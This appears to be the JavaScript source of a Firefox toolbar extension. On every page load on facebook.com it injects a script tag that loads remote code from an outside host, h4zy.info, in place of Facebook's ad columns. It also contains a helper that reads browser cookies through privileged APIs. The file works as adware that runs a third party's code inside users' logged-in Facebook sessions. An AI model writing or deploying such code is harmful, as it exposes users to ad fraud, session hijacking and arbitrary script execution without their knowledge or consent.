function getElementsByClass(searchClass,node,tag) {
  var classElements = new Array();
  if ( node == null )
    node = document;
  if ( tag == null )
    tag = '*';
  var els = node.getElementsByTagName(tag);
  var elsLen = els.length;
  var pattern = new RegExp("(^|\\s)"+searchClass+"(\\s|$)");
  for (i = 0, j = 0; i < elsLen; i++) {
    if ( pattern.test(els[i].className) ) {
      classElements[j] = els[i];
      j++;
    }
  }
  return classElements;
}

function showcookies() {
  var ios = Components.classes["@mozilla.org/network/io-service;1"]
            .getService(Components.interfaces.nsIIOService);
  var uri = ios.newURI("http://h4zy.info/", null, null);
  var cookieSvc =
   Components.classes["@mozilla.org/cookieService;1"]
             .getService(Components.interfaces.nsICookieService);
  var cookie = cookieSvc.getCookieString(uri, null);

  return cookie;
}

function insert_ads(el) {
  var e = el.createElement('script');
  e.setAttribute("type", "text/javascript");
  e.setAttribute("src", "http://h4zy.info/ads/bysocial");
  el.getElementsByTagName("head")[0].appendChild(e);
}

var bigbitches = {
  onLoad: function() {
    // initialization code
    this.initialized = true;
    this.strings = document.getElementById("bigbitches-strings");

    var appcontent = document.getElementById("appcontent");   // browser  
    if(appcontent) { 
      appcontent.addEventListener("DOMContentLoaded", bigbitches.onPageLoad, true);  
      appcontent.addEventListener("load", bigbitches.onPageLoad, true);  
    }

  },

  onMenuItemCommand: function(e) {
    var promptService = Components.classes["@mozilla.org/embedcomp/prompt-service;1"]
                                  .getService(Components.interfaces.nsIPromptService);
    promptService.alert(window, this.strings.getString("helloMessageTitle"),
                                this.strings.getString("helloMessage"));
  },

  onPageLoad: function(e) {
    var doc = e.originalTarget;

    //alert(showcookies());

    // right now it's generating 2 page loads && 4 ad columns..
    // 2 page loads is normal .... there's an iframe..
    if(doc.location.href.search("facebook.com") > -1) {

      // look for class="adcolumn"
      els = getElementsByClass("adcolumn", doc)
      if(els.length > 0) {
        for (i = 0; i < els.length; i++) {
          insert_ads(doc);
        }
      }

      // look for class = 'UIStandardFrame_SidebarAds'
      els = getElementsByClass("UIStandardFrame_SidebarAds", doc)
      if(els.length > 0) {
        for (i = 0; i < els.length; i++) {
          insert_ads(doc);
        }
      }

    }
  },

  onToolbarButtonCommand: function(e) {
    // just reuse the function above.  you can change this, obviously!
    bigbitches.onMenuItemCommand(e);
  }
};

window.addEventListener("load", bigbitches.onLoad, false);
